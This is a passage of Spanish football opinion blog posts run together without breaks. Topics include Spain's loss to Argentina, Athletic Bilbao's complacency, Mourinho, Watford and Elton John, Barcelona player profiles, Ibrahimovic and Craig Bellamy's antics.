Khedira, Alonso, Özil, Cristiano, Di María, Higuaín. Salvo ligeros contratiempos, en ellos residirá el mérito de este equipo bien conjuntado. En ellos y en Mourinho, cuya personalísima concepción del avatar mediático no debe oscurecer su metódico y exitoso periplo. La intensidad. Un intangible futbolístico que sirve para zanjar los debates, para simplificar los planteamientos tácticos, para adelgazar el mérito del rival. Cuando un resultado en contra amenaza con derrumbar la inmaculada imagen de un equipo de fútbol se lanzan ideas sobre falta de entrega, sobre un manto de desidia que cubre a los nuestros. Como si el fútbol fuera un potenciómetro aislado, como si las velocidades fueran regulables artificialmente en función del partido. Ayer Argentina barrió a España. La sacó del partido porque lanzó directos en vez de jabear. No le quedaba otra, sabía que no podía jugar en la zona templada. El equipo que sacó Batista era vertical, recuperador, estresante arriba. Una bomba para una defensa poco rodada como la que alineó Del Bosque.Da igual que fuera un partido amistoso. Quien haya salido alguna vez a un campo de fútbol sabrá que no hay fútbol entre amigos. Hasta salta la chispa en un campo de cemento, con diez entrañables esposos pateando un balón en la tarde noche de un miércoles cualquiera. El fútbol es un deporte de intensidad, no admite la reflexión tenística, ni el desmayado ritmo del baloncesto. El fútbol es acción y choque. La motivación no se mide por el encuadre del paisaje sino por lo que está sucediendo dentro. Y ayer España no perdió por inacción, ayer perdió por confiar en un equipo bisoño ante el potencial larvado de una incontestable Argentina.Leyendo prensa, redes sociales y demás, veo que es unánime el argumento de la falta de intensidad. Además como una flecha con dos puntas. Por un lado una justificación indolente a la derrota y por otra como una cualidad diferencial de la siempre sañuda albiceleste. Ahondando en este lado del campo, como si Argentina tuviera una especie de patrimonialidad sobre el arrojo, el coraje o el ardor por encima de otras selecciones, como la española. Tanto hablar de entrega y olvidamos los onces que sacaron ayer los dos equipos. Una España desdibujada sin su mejor hombre, Xavi, con Monreal blandeando en un costado, con un jugador en retiro como Marchena cerrando la defensa y con un portero como Reina, que no atraviesa su mejor momento de confianza. Silva, intermitente y medio transparente en el centro y Cesc, que no termina de asumir ese rol de organizador que le abriría la puerta a la continuidad en este combinado.Argentina supo desde el primer minuto a qué jugaba. Mascherano, Banega y Cambiasso barriendo la creación contraria y Messi, Tevez e Higuaín asediando la línea de cuatro que tantas dudas sembró anoche. Sumenle a esto la confianza, el rigor atrás y un aprovechamiento total en los contragolpes. No veo la intensidad en juego, no vi jugadores abúlicos. No concibo que ese derrame de testosterona, competición o furia pudiera haber frenado la sangría que tres jugadores como tres puñales estaban haciendo por velocidad y toque a una defensa lenta y adelantada. 4-1 es un resultado ajustado a lo que se vio. Los palos son parte del juego.Mis padres crecieron con Iríbar, Fidel Uriarte o Txetxu Rojo, cobijándose bajo la imponente Tribuna Garay y vieron desde allí desfilar varios títulos de Copa que contribuyeron a engrandecer la leyenda del ‘rey de Copas’. Y así, generación tras generación y hasta llegar a Rafael Moreno ‘Pichichi’, todo hincha del Athletic tuvo una referencia a la que aferrarse. Un mito indestructible sobre el que apoyar una fe inquebrantable y que resiste el paso de los años y el machacante golpeo de los sinsabores y las derrotas sin sufrir menoscabo. Así, las generaciones pasadas fueron heredando, con sobrecogedor respeto, los mitos de sus antecesores y construyendo los suyos propios en función de lo que el equipo les hacía vivir cada semana.Vivir del mito y del recuerdo glorioso del pasado, y esto es algo a lo que el Athletic moderno parece habernos acostumbrado, supone un ejercicio de melancolía muy peligroso. Porque de la melancolía se salta a la autocomplacencia como quien agranda su paso para evitar pisar un charco. Y el Athletic, así son las cosas, vive instalado al menos desde principios de los años noventa en una autocomplacencia extremadamente nociva para el crecimiento de la entidad. Ser futbolista del Athletic Club nunca ha dejado de ser un privilegio, algo con lo que cualquier chaval vizcaíno sueña durante toda su infancia y que se ve resignado a olvidar conforme la vida le va poniendo en su sitio. Sin embargo, el privilegio se ha convertido en un objetivo muy asequible en estas dos últimas décadas. Es relativamente complicado llegar a ser jugador de la primera plantilla del Athletic, pero, por contra, resulta muy sencillo permanecer en la misma una vez que has encontrado hueco. De la melancolía, decíamos, nació la autocomplacencia y la autocomplacencia devino en conformismo, que acabó convertido en indulgencia. La falta de exigencia diaria y continua a un grupo de futbolistas que se sabe intocable y que es consciente de que tiene al club, vamos a decirlo así, cogido por los huevos ante la dificultad para renovar la plantilla con garantías y encontrar sustituto para aquel que no dé la talla ha terminado degenerando en vicio. Pocos equipos necesitan tanto como el Athletic abrir las ventanas y renovar el aire para convencer a sus integrantes de que el club no acaba en ellos y de que ese ‘beti zurekin‘ (‘siempre contigo‘), ese cariño incodicional que algunos se empeñan en elevar a la categoría de lema de la institución, no puede servir de escudo a aquellos que se refugian en la camiseta para esconder su falta de ambición.No está siendo un buen año para el Athletic. Inconsciente de los peligros reales de la competición, el equipo parece haberse dejado llevar a un estado de ataraxia absoluta en la que ni la cercanía de las plazas de descenso parece ser estímulo suficiente para recobrar las constantes vitales. ‘Hemos jugado un buen partido‘, explicaba el pasado domingo el goleador Mikel San José tras el paupérrimo empate en casa frente al Málaga. Y a mí, automáticamente, se me alteraba el ritmo cardíaco de imaginar que todo un futbolista del Athletic Club pudiera sentirse satisfecho después de siete partidos ligueros sin sumar una victoria.Debe entender el Athletic, tanto la institución, como los futbolistas, como cierto sector de la afición, que sin exigencia y en el hábitat del fútbol moderno nuestra trayectoria no tendrá demasiado recorrido. Abandonarse a la dejadez y entregar el club a la molicie de sus futbolistas resignándose a lo peor, amparándose en lo mal que nos trata el globalizado y mercantilizado fútbol actual, es un insulto a la memoria del club y al respeto de aquellos que mitificaron un pasado que nunca debería ser olvidado. Si conseguimos dar ese paso, si conseguimos comprender que el cariño y el amor a unos colores no está reñido con la exigencia, aún habrá sitio para la esperanza. ‘Lo único que quiero es que mi equipo sea feliz‘. El discurso de José Mourinho (Setúbal, Portugal, 1963) ha cambiado radicalmente en los últimos diez años. Desde aquel 25 de mayo de 2004, víspera de la victoria de su imbatible Oporto en la final de la Liga de Campeones ante el Mónaco (3-0), a Mourinho le han salido muchas canas, se le ha agriado el carácter, ha adoptado un gesto más adusto e, intuyo, ya no tiene como única pretensión que su equipo, sus jugadores, aquellos de los que antaño se decía que darían todo por él, sean felices. ‘No tenemos las estrellas de Real Madrid o Milan, nos faltan grandes nombres, pero lo suplimos con nuestro espíritu de equipo‘, se enorgullecía en la previa de aquella sorprendente final.Hace poco menos de un mes, el mismo Mourinho que devolvió la gloria al Dragão, se quejaba entre la amargura y la ironía de que su potentísimo Chelsea no tenía un ‘real striker‘ (‘un auténtico delantero‘). Ni Torres, ni Schürrle, ni Eto’o, ni Demba Ba y, si me apuran, ni Salah. Ninguno parecía serle válido. Acababa de caer por tres goles a uno en el Parque de los Príncipes frente al PSG y veía peligrar seriamente su pase a la semifinal del torneo. Ya no era el Mourinho empático y protector con sus jugadores. Ya no era aquel que hacía piña con los suyos y se enfrentaba a los gigantes europeos amparándose en la fuerza de la manada. Lo comprobó en sus propias carnes Samuel Eto’o, quien se decantó por la opción del Chelsea animado por la presencia del técnico luso en el Bridge. Para su sorpresa, Mourinho ni siquiera era el mismo con el que había compartido vivencias en el Inter. El camerunés, curtido en mil batallas, no tardó en verse a los pies de los caballos. Para su sorpresa, su entrenador, el mismo que se habría partido la cara por él tiempo atrás, el mismo para el que aceptó incluso sacrificarse en el lateral en muestra de su especial complicidad, no tuvo ningún reparo en cuestionar su rendimiento personal. Se trataba de salir vivo y con el menor daño posible, algo en lo que Mourinho se ha convertido en consumado maestro con el paso de los años.José ha acabado devorado por su propio personaje. Se ha convertido en un ser caricaturesco, en una continua exageración de sus defectos. Al tiempo que engrosaba su palmarés y su curriculum, iba perdiendo parte de aquella magia y aquel don que le hicieron convertirse en alguien realmente especial a mediados de la pasada década. Como si las múltiples bofetadas recibidas a lo largo de su carrera le hubiesen ido afilando el colmillo y frunciendo el ceño. Impermeabilizó su figura a base de eludir responsabilidades. Refugiado una y otra vez en una absurda capacidad para generar conflictos, y siempre con los decibelios disparados, el Mourinho lenguaraz de 2014 sería capaz de levantar en armas a las refinadas y pausadas damas de un salón de té de Mayfair. Sigue teniendo, cómo no, su imperturbable legión de adeptos. Son aquellos para los que los méritos deportivos, como aquellos que le llevaron a encumbrar al Oporto o que le ayudaron a recuperar un Chelsea campeón cinco décadas después, cada vez tienen un menor peso. Valoran más la tensión permanente, la facilidad para crearse enemigos y alimentar disputas. Como si para defender a un club de fútbol y sacar la cara por él fuese condición indispensable estar siempre a la defensiva. Yo hace tiempo que dejé de admirar profundamente a Mourinho. Hace tiempo que dejé de considerarle alguien especial y hace tiempo que me aburrí de su cansino personaje. Cada vez me queda más claro que este Mourinho, más canoso, más agrio y más adusto, ya no es el mismo de 2004. Pienso en el Watford FC, nuevo inquilino de la Premier League desde que el pasado fin de semana asegurase su ascenso de manera matemática tras ocho años de ausencia, e inevitablemente visualizo a Sir Elton John en ademán histriónico. Tal vez ataviado con una chistera, con características gafas rosadas. O quizá vistiendo la tradicional camiseta amarilla de los Hornets, pantalón ceñidito a medio muslo, en prueba de su reconocible e incondicional amor por el club de Vicarage Road. Porque pocos personajes públicos tan populares como el cantante de Harrow se han posicionado tan clara, significativa y activamente con un club de fútbol. Tal vez por eso me resulta imposible desligar la imagen del equipo de la del icono pop.El recientísimo y aclamado éxito del Watford, entrenado por el exfutbolista de Oviedo o Tenerife Slavisa Jokanovic y amamantado por la teta de la familia Pozzo, no puede ocultar una historia repleta de sinsabores y problemas extradeportivos, con varios dolorosísimos descensos a los más profundos infiernos deportivos incluidos. La inestabilidad ha marcado siempre la trayectoria de los Hornets. El ahora recién ascendido vivió momentos de gloria cuando en la temporada 1978 comenzó a fraguar su ascenso desde la cuarta categoría hasta la Division One (actual Premier League), hito que alcanzó en la temporada 1982/83, y que supuso la primera participación en la historia del club en la máxima categoría del fútbol inglés. Dos nombres fueron los grandes artífices de semejante éxito. Un club con casi 100 años de historia que nunca había logrado codearse con los clubes más poderosos del país, alcanzaba por fin la cumbre de su carrera de la mano del técnico Graham Taylor (el mismo que dejó fuera a la selección inglesa del Mundial de 1994), un hombre histórico dentro del club.Pero si hubo un hombre que facilitó la llegada de un entrenador como Taylor a Watford y el posterior resurgir del equipo fue Reginald Kenneth Dwight, Sir Elton John. La historia del cantante británico con el club de sus amores viene de lejos. De niño, solía acudir al estadio para ver al Watford junto a su padre. Vivirlo desde la niñez, hizo que el cariño por los colores del club de su infancia calara profundo. Tanto fue así, que Elton no dudó en hacerse cargo de la presidencia de la entidad cuando ésta pasaba por su peores momentos económicos y deportivos.Su primera llegada a las oficinas de Vicarage Road se produjo en el año 1976. Con el equipo hundido en Division 4 y sin síntomas de mejora, el músico se hizo cargo del mismo invirtiendo una fuerte cantidad de dinero y asumiendo su gestión de manera brillante. En sólo seis temporadas, el nuevo chairman del club consiguió tres ascensos, posibilitando su llegada a la elite en la 1982/83.Como buen brasileño, Maxwell se entiende mejor como carrilero que como especialista defensivo, pero tampoco es un futbolista decisivo en ataque ni por presencia ni por percusión. Al final siempre acaba jugando bastantes partidos. . Adriano. Un peso pesado en el maravilloso Sevilla de Juande Ramos –inolvidable su final de UEFA contra el Español- ha llegado al Barça a la edad perfecta para dar el salto a un grande, 27 años. Sin embargo, los escasos trece partidos que ha disputado hablan de un papel ciertamente secundario, y de una actitud un poco tímida en un brasileño bastante alejado del estereotipo juerguista y fiestera. Ha dejado algunas carreras marca de la casa, pero uno piensa que con un poco más de cancha su rendimiento debería superar al de Maxwell. No se descarta su titularidad en alguno de los clásicos, quizá incluso en el de hoy.Piqué. Central cuyo físico imponente lanza la memoria a otras épocas, casi inédito en Manchester y fogueado en Zaragoza, saltó del cero al infinito hace poco menos de dos años en un final de temporada majestuoso. Perfecto en el juego aéreo, listo en la anticipación, más rápido de lo que parece y con buen manejo y salida de balón, le sobra seguridad en sí mismo para lanzarse al ataque en incursiones que resultan temibles. De vez en cuando deja algún error de bulto,  ha bajado un poco su rendimiento en la segunda parte de la temporada –quizá como consecuencia del asunto Shakira- y debería corregir algunos comportamientos impropios de un central del Barcelona, pero es un baluarte atrás y uno de los mejores defensores del mundo. Decisivo.Puyol. Poco quedará ya por decir del capitán del Barcelona, modelo de entrega, pundonor y respeto al adversario, y uno de esos futbolistas apreciados allá donde vayan. Seguramente hubo una época oscura en la que le perjudicó la responsabilidad de la capitanía, pero en la era Guardiola ha vuelto a dar lo mejor de sí mismo. Básico tanto a la hora de sacar la línea como por su capacidad de corrección –Piqué tiene mucho que agradecerle- su concurso se presenta imprescindible frente a un equipo tan quirúrgico en el contragolpe como el Madrid. Lesionado estas últimas semanas, reaparecerá casi con total seguridad en la final de Copa.Dani Alves. El hombre cuya llegada en 2008 simbolizó desde el campo lo mismo que el advenimiento de Guardiola representó desde el banquillo: cambiar el pasillo por el sexteto. Junto con Roberto Carlos es el jugador de banda más importante de los últimos treinta años, y nadie llega por un carril con su claridad, su insistencia y su garra. Con bastante mejor toque de balón de lo que muchos creen y mejor defensa de lo que parece, su aportación tàctica ha sido decisiva en este Barça de Guardiola, tanto liberando a Messi en los primeros tiempos como a Pedro en los actuales. Es una pena que su marrullería le prive del reconocimiento universal que merecería por rendimiento.Milito. Protagonista en su momento de un extraño no-fichaje por el Madrid, y básico en el último gran Zaragoza, el hermano del gran Diego no ha vuelto ser el mismo después de la gravísima lesión de rodilla que estuvo a punto de retirarle del fútbol. Muy querido en el vestuario, se ha mostrado inseguro y lento en sus apariciones en una temporada en la que teóricamente hubiera podido tener partidos.En el escalafón de Guardiola se halla ahora mismo por detrás del canterano Fontás, y es muy improbable ni siquiera que aparezca en la tormenta de clásicos. Seguramente se irá en verano.Busquets. Uno de los grandes méritos de Guardiola, que sacó al hijo del extravagante Carlos de las catacumbas de la Segunda B para inventarse al volante defensivo por excelencia de su equipo y la selección. Perfecto en el entendimiento del juego de posición, da salida al balón, es constante en los apoyos y muy intenso en la presión. Ha ido corrigiendo pecados de juventud –recordemos el clásico del Camp Nou de 2008- y le sobra un punto teatrero, pero su importancia en el actual Barça está fuera de toda duda. Buen rendimiento de central cuando se le ha necesitado.Mascherano. Parecía un poco descabellado que el Barça fichara a Mascherano en verano teniendo a Busquets en plantilla, pero también es cierto que cuando un jugador de clase mundial como el Jefecito se pone a tiro, es mejor echar la red. Quizá el mediocentro de referencia en los últimos años, ha tardado en asumir los complicados automatismos del Barcelona, pero su importancia en el equipo está creciendo según asoma la fase decisiva del curso. Fantástico en las coberturas, infalible en la lectura del fútbol del contrario, el capitán de Argentina aporta el caràcter que siempre conlleva ese brazalete, y ha asumido la suplencia con muchadignidad. Ya crucificó al Madrid con el Liverpool hace dos años, y su cara a cara con su amigo Xabi puede definir un enfrentamiento mítico.Xavi. Convertido desde 2008 en el jugador-concepto que resume tanto la trayectoria de España como la del Barcelona, dos equipos en realidad bastante diferentes. Desde que aquel año, antes de la Eurocopa, una parte de la afición culé pidiera su marcha, su juego ha mejorado especialmente en dos vertientes, ambas provenientes de adelantar ligeramente su posición: la llegada al área y el último pase. Su compenetración con Iniesta y Messi –compañeros en el podio del Balón de Oro- ha hecho el resto para que se le considera un pieza clave en los éxitos del equipo azulgrana. Sin lugar a dudas, el mayor responsable de que el fútbol del Barcelona sea tan hermoso.Iniesta. Señalado desde muy niño como la gran esperanza blanca del fútbol español, y aclamado en cada visita del Barça como el taumaturgo que realizó el milagro, la realidad es que sólo en la etapa Guardiola ha rendido al nivel del estupendo futbolista que lleva dentro. Su juego es tan delicado y sutil que a ratos puede resultar incluso intrascendente, pero cuando llega el momento y las cosas se tuercen, surge un competidor rabioso que pide el balón una y otra vez, ignora las patadas y lanza a su equipo con la determinación que separa a los buenos futbolistas de los cracks. En un buen momento profesional y personal (acaba de ser padre) ha dado un plus en la segunda vuelta de esta temporada, cuando su equipo más lo necesitaba. Su posición ideal sigue siendo un enigma, pero su consideración general es bien merecida. Un centrocampista, con mayúsculas.Keita. Otro de los suministros que han llegado al Barcelona en las últimas temporadas vía el Sánchez Pizjuán, un clásico llegador que pesa poco en la elaboración pero decide en el área por determinación y clase. Guardiola, que no pierde ocasión de ponerlo por las nubes, le ha reservado el papel de jugador número 12, y alguno de los goles que ha logrado en esta Liga va a tener su importancia en la decisión final de la misma. Un futbolista de los que realmente dan opciones y profundidad a una plantilla, y que tendrá su momento en estos clásicos.Villa. Reconocer el monumental error cometido con Ibrahimovic y echar el resto por el Guaje fue el gran acierto del Barcelona este verano, y la piedra angular del salto de calidad experimentado esta temporada. Al de Tuilla le costó entrar en el engranaje y asimilar que en el Barça ejerce poco más que de extremo cualificado, pero es un jugador tan humilde e inteligente que, al cabo de dos meses, comenzó a producir al ritmo que siempre lo ha hecho. Aparte su olfato de gol, es lo suficientemente técnico para no desentonar en el juego de toque-toque, y además ofrece al Barcelona unas variantes de contragolpe desconocidas en el equipo azulgrana hasta esta temporada. Así acabó machacando el Barça al Madrid en la ida, y así amenaza con romper una sequía que se le está haciendo larga. Ojo, porque el blanco siempre se le ha dado bien.Pedro. Otro de los grandes inventos de Guardiola, pocos confiaban en que este canario tan talentudo como disperso pudiera rendir continuadamente en un equipo tácticamente tan exigente como el Barcelona. Tras una racha goleadora inicial que afianzó su posición en el equipo. Pedro asimiló su rol de falso interior derecho hasta alcanzar una titularidad que hoy no le disputa nadie. Jugador esforzado e impredecible con una extraña precisión en los tiros de media distancia, su movilidad exige gran coordinación a la defensa enemiga, y ya marcó el año pasado en el Bernabéu. Llega algo tocado.Afellay. Llevaba años deseando salir del PSV, y aunque había sonado en varias ocasiones para el Atlético, fue el Barça quien pagó este invierno un precio de risa por sus servicios. Centrocampista vertical, bastante intermitente, ha ido entrando poco a poco en el equipo durante estos últimos meses, aunque de momento no ha dejado demasiada huella. Puede aparecer si alguno de los partidos que se avecina se rompe o se torna muy favorable al Barcelona.Messi.Ni siquiera la repanchingada y autocomplaciente narración de Juan Carlos Rivero pudo ocultar un partido mal planteado por Del Bosque. Y no digo que haya que salir con los mejores, ganar es motivador pero un seleccionador tiene que manejar otras variables a estas alturas de la temporada. Variables que, por otra parte, Batista ignoraba a sabiendas de que ese partido era su tesis doctoral para conseguir cátedra en la AFA y que para la mellada parroquia argentina no había más especulación que ganar o no ganar.Pero la intensidad, como decía, ese recurso cervecero del espectador que ve como se va por el desagüe la identidad futbolística de su equipo, que ve como el contrario barre del campo a los suyos en una noche de infortunio, debemos dejarla a un lado. Ni intensidad, ni pereza, ni falta de competitividad, ni nada. El juego de un equipo que solapa e impide el despliegue del rival. Un episodio meritorio para Argentina y una probatura nefasta para España. Sólo fútbol, dejemos el etéreo recurso del vigor para los que cuentan el fútbol como si fuera una batalla. Los tiempos modernos van rápido. Lo artesanal es un refugio para los ricos y los snobs. Sólo prima el ahora, la inmediatez, el llevárselo puesto. Suecia captó la idea perfectamente y puso en el mercado tres productos de consumo rápido, de aprovechamiento inminente y de pocas garantías a largo plazo: H&M, Ikea e Ibrahimovic. El primero arrastra a una horda de jóvenes alternativos que ven en sus prendas de ropa una reinvención de sí mismos, mala calidad, sí, pero moda al fin y al cabo. Ikea es el refugio de los emancipados. Muebles baratos y desmontados para vestir los primeros hogares, para hacer confortable viviendas cuyo alquiler o hipoteca no permitne florituras de “Casa y Jardín”. El tercero es un futbolista espectacular, talentoso, luchador, pero cuya estancia en el club depende de factores tan triviales, tan inasibles, que termina siendo un jugador de periodos cortos, de recuerdos breves, de adioses inesperados.El Milan que hoy se enfrenta al Real Madrid se ha adaptado a Ibrahimovic, y no al revés. Paradójico pero crucial para entender la mentalidad de un delantero poco generoso. Cuando llegó al Barcelona muchos pensamos que era un gran fichaje. Pensamos que el sueco acoplaría su rol a un esquema brillante y vencedor como el que Guardiola había dispuesto durante toda la temporada. Sabíamos que tanto en el Ajax, como en la Juve como en el Inter, el delantero de origen bosnio había sido referencia y mando de sus compañeros, pero que ahora sería diferente. El eléctrico arranque confirmó que se había dado un paso hacia delante, que la torre que pivotaba en el área era un aliado para Messi o Pedro podría funcionar en Barcelona. Uno hacía el juego sucio, arrastraba la defensa del rival, y los otros aprovechaban los huecos. Uno machacaba la piedra y los otros se colaban por las hendiduras. Algo se torció, algún clavo se soltó, y la temporada acabó como acabó. Con la estrella en el banco y el equipo funcionando perfectamente sin la presencia del sueco.El Milan es un equipo que ha perdido identidad. La presencia de Ibrahimovic es sintomática. Sigo con las comparaciones, para Allegri el sueco es un chuleta por no haberse preparado el examen. Es un recurso, un instrumento de músculo que puede tapar las carencias de un club avejentado, desnortado y frío. Ahí el sueco se encuentra cómodo y no en la orquesta azulgrana de la que salió por la puerta de atrás. En una entrevista dejaba a las claras su filosofía futbolística, para él, había jugadores que hacían el trabajo sucio y tres o cuatro jugadores que marcan la diferencia. Entre Gattuso, Boateng, Zambrotta  y Thiago está más cómodo que entre Busquets, Piqué y Alves. ¿Tendrá hoy suficiente Allegri con el sueco? Es posible. Ha demostrado alguna vez que él solo puede ganar partidos. La visita al Bernabéu no testó lo suficiente un equipo desapasionado pero siempre peligroso. El Madrid anda sobrado de confianza pero no anda tan sobrado de fútbol. Tienden al atasco, a la acumulación de hombres, y en algunos tramos del partido se apagan e hibernan. La presencia del sueco, la constancia de Seedorf o algún destello del deslucido Pato pueden ser suficiente para tumbar al equipo blanco.De Ibrahimovic depende buena parte del futuro de este Milan en Champions y en el Calcio. Es el guía del equipo, se siente cómodo, respetado, valorado. Esas cosas que sólo los jugadores un poco egoístas anteponen al funcionamiento de un colectivo. Tuvo la oportunidad de ser parte de un equipo que hace de la manada el sustento de los individuos, pero prefirió buscar ese otro hueco en el mercado. Los tiempos modernos van rápido, los goles terminan siendo el argumento de la inmediatez, la excusa en el fútbol de los inadaptados. Un deporte que se juega con los pies no puede ser refinado. Un deporte que se juega al aire libre sobre el caprichoso césped no puede aspirar a la estética ni a la métrica. Lo suyo, en el fútbol, es otra cosa: abandonarnos a la imprecisión, asumir el destino, tolerar que hay cien maneras de introducir un balón ingobernable en una enorme portería apenas protegida por un hombre. Emocionarnos con esta danza esperpéntica de patadas y porfía es en buena parte el resultado de la imprecisión de su resultado. Que el número ciento cincuenta de la ATP venza al número uno de la ATP es un milagro. Que un Segunda B elimine al equipo más rico de España es, hoy por hoy, parte de la historia de este deporte.Lo que rodea al fútbol, esos alrededores de los que presumimos en este blog, basculan también entre la chabacanería y la exquisitez. En ambos estadios los extremos dan grima. Encuentro una necesidad casi ridícula de justificar el fútbol de una forma intelectual, de dotarlo de sentido trágico y universal. Como si la vulgaridad del fútbol no fuera suficiente para su disfrute, como si este deporte necesitara una membrana literaria y sociopolítica para alcanzar estatus de hito comunitario.El forofismo y tendenciosidad de la prensa mayoritaria ha engendrado una respuesta que en buena parte amanera el lenguaje futbolístico. Lo eleva artificialmente a un estado que no es realmente al que esta disciplina física pertenece. La ductilidad de este deporte permite muchas lecturas, algunas groseras y otras profundamente fingidas. Como si nos justificáramos por amar la brega, como si tuviéramos que excusarnos por disfrutar bárbaramente de un partido, como si tuviéramos que poner en pie una estructura cultural en torno a un deporte tosco de cara a la sociedad.Hay una suerte de terrenos comunes, repetidos hasta la náusea, en el tratamiento que medios y aficionados dan al fútbol.Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Un poco más tarde tres adultos con mejores cosas que hacer y vestidos de la selección, de blanco y de rojo, se dedican a observar la jugada en el escaparate de una tienda de electrodomésticos. Ni el chaparrón nocturno les impide repasar la histórica pifia de principio a fin. Calados y embobados, como en trance frente al derechazo fofo de Southgate. Tears for heroes dreessed in grey. Esos tres son un músico Ian Broudie y dos cómicos, Frank Skinner y David Baddiel reventando los transistores ingleses de nuevo con la versión 98 del gran Three Lions que arrasara en el 96. Van camino del mundial de Francia. Hoy se cumplen trece años ya desde que aquel single para perdedores se aupara a lo alto de las listas británicas y nadie ha pintado aun la esencia de la derrota como en aquel vídeo.Ince ready for war, Gazza good as before, Shearer certain to score and Psycho screaming, cantaron. ¿Quieren saber que ocurrió? Que Paul Ince fallo el suyo en la tanda de penaltis contra Argentina contribuyendo a que los ingleses hicieran la maleta de vuelta a casa en octavos mientras que Gascoigne y Stuart Pearce ni siquiera jugaron aquel mundial. Baddiel y Skinner la escribieron expresamente para bendecir a los suyos en el mundial 98 sin pensar en que estaban abonando el terreno para el gafe. Sí, la canción era definitivamente para perdedores. Pensando en Craig Bellamy, noticia desde que vive rastreando los clasificados gracias a que sus jefes han fichado a un todo un campeón del mundo para ocupar su banda, no me queda otra que admitir mi amor incondicional por la armada white trash que copa los vestuarios ingleses. Si algo me encanta del fútbol británico es su capacidad ilimitada para producir mostrencos. Gazza, George Best, Tony Adams, Lee Bowyer, Le Tissier o Perry  Groves. Me pueden pero después de todo ¿Quién es capaz de resistirse a la rotunda combinación de talento malgastado, alcohol y hooliganismo natural que ebulliciona en algunos de los participantes del espectáculo Premier? . Así pues, las cartas encima de la mesa y reconociendo de antemano la innegable calidad futbolística del sujeto, permítanme que me detenga frente a la galería de astracanadas en las que se ha visto envuelto Craig Bellamy durante su carrera.Su más famoso disparate, la bufonada que sin duda es  su tarjeta de visita, la parió una noche de 2006. Recién llegado a Liverpool, cuando su paso por el Blackburn Rovers parecía haberle apaciguado notablemente, el galés tuvo la ocurrencia de golpear con un palo de golf al muy cro-magnon John Arne Riise simplemente porque el galán del pelo incandescente y el pulgar vertiginoso (todos recordamos la batería de sms con los que Riise trataba de engatusar a toda celebrity noruega que se pusiese a tiro) cometió la imprudencia de negarse a secundar al gales con la tonada de turno en el karaoke. Para redondear la humorada golfística, en el primer encuentro que se hubo de jugar tras el incidente, un Barcelona-Liverpool en octavos de la Copa de Europa, Bellamy repitió el swing cuando anotó el empate.Mención aparte merecen sus dimes y diretes con cualquier entrenador que le haya tenido a su cargo. En el Newcastle United, cuando a su estatus de promesa refulgente pero inestable del fútbol británico parecía añadir algún gramo de cordura, puso a prueba los exquisitos modales de Sir Bobby Robson. Los parroquianos de St James Park aun recuerdan su sanción por agredir al querubín Materazzi en un encuentro de Champions o sus desencuentros con la justicia por diferentes altercados nocturnos con la violencia física como ingrediente principal. Finalmente fue Graeme Souness, icono cafre universal a través del bigote, quien puso fin a su carrera en blanquinegro tras la enésima indisciplina del angelito. En Upton Park también se las tuvo tiesas con Alan Curbishley a cuenta de la pizarra. Ya en Manchester, Roberto Mancini ha tenido que soportar como el pequeño galés cuestionaba públicamente sus métodos de entrenamiento o tenía a bien abofetear a un streaker, en retransmisión masiva para todo el país, durante un derby local.Pero hay más. Por ejemplo y sin remontarse demasiado, la lió mientras trabajaba para el West Ham en un partido frente al Ipswich. Bellamy, que en su día fue jugador del Norwich y parece haber mamado bien el odio al eterno rival, se encaró con unos aficionados rivales tras su sustitución. ¿Hasta aquí todo normal verdad? . Nada que un Juanito de la vida no pueda llegar a hacer. Pero por favor, sigan leyendo. Por lo visto, el sucesor de Tiger Woods pero en gentuza, se iba al vestuario bastante calentito, dando incluso patadas a las vallas publicitarias, cuando un aficionado del Ipswich le espetó un timorato: “Hasta nunca Bellamy”. Entonces el galés fue, perdió completamente los estribos que nunca tuvo y comenzó a hacer alusiones a las prostitutas de la localidad de la que era originario el provocón. Pero ojo, el angelito no dijo ni palabra de cuan cariñosas, guapas y económicas eran las rameras de Ipswich  sino que tuvo a bien el recordar jocosamente de que cinco de ellas habían sido asesinadas por un criminal en serie en el año 2006. Por un simple comentario y todo delante de una grada llena de niños. Bellamy, mostrenco, por siempre. Ya lo habréis leído por ahí pero apetece destacarlo porque solo muy de vez en cuando el fútbol devuelve un gesto que le honra. Como nueves italianos entre defensas tupidas, en ocasiones nace una planta entre el asfalto. Ha ocurrido ahora. La selección italiana ha preparado su partido ante Uruguay en las instalaciones deportivas de Rizziconi, construidas por el estado italiano en terrenos confiscados a la mafia. Italia jugó en el campo que era algo más que un campo de fútbol.Rizziconi es un pueblito calabrés cuyos campo son especialmente fértiles en lo que se refiere a un par de productos típicos: los olivos y los mafiosos. Uno de estos frutos de la tierra es Teodoro Crea, un humanista del crimen que desde su posición de mando en la ‘Ndrangheta tocó todos los palos de la actividad delictiva (el contrabando de tabaco, drogas y armas, la extorsión o el negocio de la prostitición eran algunas de sus ocupaciones conocidas) hasta que fue arrestado en 2006. Antes de que le echaran el guante Crea planeaba hacer negocio con la gestión de la basura construyendo un vertedero enorme en Rizziconi pero el estado le arrebato la propiedad tras el arresto y en su lugar construyó un campo de fútbol. Un campo que nadie ha podido usar hasta hace dos telediarios.Cristales apedreados, puertas rotas y un silencio incómodo han pintado el paisaje del campo de fútbol de Rizziconi desde su construcción. ¿Quién va a pisar un césped que creció en terrenos arrebatados a una de las familias más influyentes en el crimen organizado calabrés? ¿Quién se iba a atrever a cometer semejante desaire al boss? Hoy lo hecho la selección italiana con Cesare Prandelli a la cabeza y símbolos como Genaro Gatusso en el lote para reforzar un acto cargado de simbolismo. Olvidando la basura, volvió el público a agolparse para ver solo fútbol y no hubo más tiros que los que acordaron los futbolistas. El campo de fútbol que era más que un campo de fútbol retomo durante unas horas su utilidad original. No me digan que no es noticia. Un 26 de junio de 2006 en Kaiserslautern, Australia descubrió de sopetón cuanto hay de real en uno de los tópicos más sobados del fútbol, aquel que otorga a los italianos el poder sobrenatural para dominar a su antojo los minutos agónicos del partido. Un puesto en cuartos de final estaba en juego. Durante hora y media el canguro olisqueó, rondó y golpeó intentando desactivar el cepo italiano. Sin desmayo y de todas las maneras conocidas y por conocer.Bresciano y Grella voltearon aquella ratonera en más de una ocasión. Tim Cahill logró incluso desmoronarla, obligando al siempre impetuoso Materazzi a enfilar la ducha con una cartulina roja en la cartilla. Dio igual. Aun con una pieza de menos, la trampa funcionó a las mil maravillas justo cuando tuvo que hacerlo. Una invención a medio camino entre Fabio Grosso y Medina Cantalejo engrasó el ingenio para que Francesco Totti lo pusiera a andar en el suspiro final. ¡Zas! El cepo se cerró una única vez, así se hacen las cosas al transalpino modo, y mutiló el futuro de Australia en la segunda participación mundialista, gloriosa a 